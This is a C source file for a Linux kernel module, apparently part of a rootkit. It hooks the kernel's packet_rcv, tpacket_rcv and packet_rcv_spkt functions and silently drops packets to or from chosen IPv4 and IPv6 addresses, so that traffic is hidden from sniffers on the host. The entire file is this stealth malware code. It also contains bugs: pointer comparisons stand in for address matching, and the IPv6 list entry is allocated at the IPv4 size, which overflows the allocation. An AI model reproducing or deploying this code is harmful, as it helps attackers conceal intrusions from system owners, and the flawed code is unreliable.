/**
 * hide_packets.c
 *
 * Hide ipv4 and ipv6 packets by hooking packet_rcv and omitting packets for specified ip addresses.
 */

#include "hook.h"
#include "function_hooking.h"
#include <linux/list.h>
#include <linux/types.h>
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/inet.h>
#include <linux/in6.h>
#include <linux/string.h>
#include <linux/netfilter_defs.h>
#include <linux/delay.h>

/* Length of ipv4 and ipv6 in bytes */
#define IPV4_LENGTH		4
#define IPV6_LENGTH     16

#define DENY_PACKET		1
#define ACCEPT_PACKET	0

/* counter for access counting */
static int accesses_packet_rcv = 0;
static int accesses_tpacket_rcv = 0;
static int accesses_packet_rcv_spkt = 0;

/* mutexes for safe accesses */
struct mutex lock_packet_rcv;
struct mutex lock_tpacket_rcv;
struct mutex lock_packet_rcv_spkt;

/* Variables to store old functions in */
int (*old_packet_rcv)(struct sk_buff *, struct net_device *,
		struct packet_type *, struct net_device *);
int (*old_tpacket_rcv)(struct sk_buff *, struct net_device *,
		struct packet_type *, struct net_device *);
int (*old_packet_rcv_spkt)(struct sk_buff *, struct net_device *,
		struct packet_type *, struct net_device *);

/* new packet receive */
int new_packet_rcv(struct sk_buff *, struct net_device *, struct packet_type *,
		struct net_device *);
int new_tpacket_rcv(struct sk_buff *, struct net_device *, struct packet_type *,
		struct net_device *);
int new_packet_rcv_spkt(struct sk_buff *, struct net_device *,
		struct packet_type *, struct net_device *);

function_hook_t *hook_packet_rcv;
function_hook_t *hook_tpacket_rcv;
function_hook_t *hook_packet_rcv_spkt;

struct ipv4_entry {
	u8 ipv4_addr[4];
	struct list_head list;
};

struct ipv6_entry {
	u8 ipv6_addr[16];
	struct list_head list;
};

LIST_HEAD( ipv4_list);

LIST_HEAD( ipv6_list);

/*
 * Check if the ip address is in the IPv4 list
 */
int is_in_list_ipv4(u8 *ip_addr) {

	struct ipv4_entry *existing_entry_v4, *tmp_v4;

	list_for_each_entry_safe(existing_entry_v4, tmp_v4, &ipv4_list, list)
	{

		// TODO check if this cast works
		if ((uint32_t) * (existing_entry_v4->ipv4_addr)
				== (uint32_t) * (ip_addr)) {
			// if entry is in list, do nothing
			return 1;
		}
	}
	return 0;
}

/*
 * Check if the Ip address is in the IPv6 list
 */
int is_in_list_ipv6(u8 *ip_addr) {

	struct ipv6_entry *existing_entry_v6, *tmp_v6;

	list_for_each_entry_safe(existing_entry_v6, tmp_v6, &ipv6_list, list)
	{
		// TODO add casts
		if (existing_entry_v6->ipv6_addr == ip_addr) {
			/* if entry is in list, do nothing */
			return 1;
		}
	}
	return 0;

}

static int packet_check(struct sk_buff *skb) {

	/* Check if it is a IPv4 Packet */
	if (skb->protocol == htons(ETH_P_IP)) {
		/* get ipv4 header */
		struct iphdr *header = ip_hdr(skb);
		/* Check both source and destination */
		if (is_in_list_ipv4((u8 *) &header->saddr)
				|| is_in_list_ipv4((u8 *) &header->daddr)) {
			/* ip in list, should be hidden */
			return DENY_PACKET;
		}
	}

	/* Check if it is a IPv6 Packet */
	if (skb->protocol == htons(ETH_P_IPV6)) {
		/* get ipv6 header */
		struct ipv6hdr *header = ipv6_hdr(skb);
		/* look for source and destination address */
		if (is_in_list_ipv6(header->saddr.s6_addr)
				|| is_in_list_ipv6(header->daddr.s6_addr)) {
			/* ip in list, should be hidden */
			return DENY_PACKET;
		}
	}

	/* no ipv4 or ipv6 packet or not in list -> Packet can be accepted */
	return ACCEPT_PACKET;
}

/*
 * Add a new package to the list to be hidden.
 * supported protocols: "ipv4" and "ipv6"
 */
void packet_hide(char *protocol, char *ip) {
	u8 ipv4_addr[4];
	u8 ipv6_addr[16];
	struct ipv4_entry *existing_entry_v4, *tmp_v4;
	struct ipv6_entry *existing_entry_v6, *tmp_v6;

	struct ipv4_entry *new_entry_v4;
	struct ipv6_entry *new_entry_v6;
	/* Convert IPv4 from text to binary format */
	if (in4_pton(ip, -1, ipv4_addr, -1, NULL)
			&& !strncmp(protocol, "ipv4", 4)) {

		/* no errors, check for occurrence in list */

		list_for_each_entry_safe(existing_entry_v4, tmp_v4, &ipv4_list, list)
		{
			if (existing_entry_v4->ipv4_addr == ipv4_addr) {
				/* There is already an entry in the list */
				return;
			}
		}

		new_entry_v4 = kmalloc(sizeof(struct ipv4_entry), GFP_KERNEL);
		if (!new_entry_v4) {
			return;
		}

		memcpy(new_entry_v4->ipv4_addr, ipv4_addr, IPV4_LENGTH);
		list_add(&new_entry_v4->list, &ipv4_list);

		return;
	}

	if (in6_pton(ip, -1, ipv6_addr, -1, NULL)
			&& !strncmp(protocol, "ipv6", 4)) {

		/* no errors, check for occurrence in list */

		list_for_each_entry_safe(existing_entry_v6, tmp_v6, &ipv6_list, list)
		{
			if (existing_entry_v6->ipv6_addr == ipv6_addr) {
				return;
			}
		}

		new_entry_v6 = kmalloc(sizeof(struct ipv4_entry), GFP_KERNEL);

		if (!new_entry_v6) {
			return;
		}

		memcpy(new_entry_v6->ipv6_addr, ipv6_addr, IPV6_LENGTH);
		list_add(&new_entry_v6->list, &ipv6_list);

	}
}

/*
 * Remove a ip address from the list
 */
void packet_unhide(char *protocol, char *ip) {
	u8 ipv4_addr[4];
	u8 ipv6_addr[16];
	struct ipv4_entry *existing_entry_v4, *tmp_v4;
	struct ipv6_entry *existing_entry_v6, *tmp_v6;

	if (in4_pton(ip, -1, ipv4_addr, -1, NULL) && !strcmp(protocol, "ipv4")) {
		/* ipv4 address in list, remove */

		list_for_each_entry_safe(existing_entry_v4, tmp_v4, &ipv4_list, list)
		{
			if (existing_entry_v4->ipv4_addr == ipv4_addr) {
				// if entry is in list, remove it
				list_del(&(existing_entry_v4->list));
				kfree(existing_entry_v4);
				return;
			}
		}

		return;
	}

	if (in6_pton(ip, -1, ipv6_addr, -1, NULL) && !strcmp(protocol, "ipv6")) {
		/* ipv6 address in list, remove */
		list_for_each_entry_safe(existing_entry_v6, tmp_v6, &ipv6_list, list)
		{
			if (existing_entry_v6->ipv6_addr == ipv6_addr) {
				/* if entry is in list, remove it */
				list_del(&(existing_entry_v6->list));
				kfree(existing_entry_v6);
				return;
			}
		}

	}
}

/*
 * Hook function for packet rcv
 */
int new_packet_rcv(struct sk_buff *skb, struct net_device *dev,
		struct packet_type *pt, struct net_device *orig_dev) {
	int ret;
	inc_critical(&lock_packet_rcv, &accesses_packet_rcv);

	/* Check if we need to hide packet */
	if (packet_check(skb)) {
		dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
		return NF_DROP;
	}

	ret = old_packet_rcv(skb, dev, pt, orig_dev);

	dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
	return ret;
}

/*
 * Hook function for tpacket rcv
 */
int new_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
		struct packet_type *pt, struct net_device *orig_dev) {
	int ret;
	inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);

	if (packet_check(skb)) {
		dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
		return NF_DROP;
	}

	ret = old_tpacket_rcv(skb, dev, pt, orig_dev);

	dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
	return ret;
}

/*
 * hook function for packet rcv spkt
 */
int new_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
		struct packet_type *pt, struct net_device *orig_dev) {

	int ret;
	inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);

	if (packet_check(skb)) {
		dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
		return NF_DROP;
	}

	ret = old_packet_rcv_spkt(skb, dev, pt, orig_dev);

	dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
	return ret;
}

void initialize_hide_packets(void) {
	hook_packet_rcv = add_function_hook_to_list("packet_rcv", new_packet_rcv,
			&old_packet_rcv);
	hook_tpacket_rcv = add_function_hook_to_list("tpacket_rcv", new_tpacket_rcv,
			&old_tpacket_rcv);
	hook_packet_rcv_spkt = add_function_hook_to_list("packet_rcv_spkt",
			new_packet_rcv_spkt, &old_packet_rcv_spkt);

	/* initialize mutexes */
	mutex_init(&lock_packet_rcv);
	mutex_init(&lock_tpacket_rcv);
	mutex_init(&lock_packet_rcv_spkt);

}

void remove_hide_packets(void) {

	while (accesses_packet_rcv > 0 || accesses_tpacket_rcv > 0
			|| accesses_packet_rcv_spkt > 0) {

		msleep(50);
	}
}
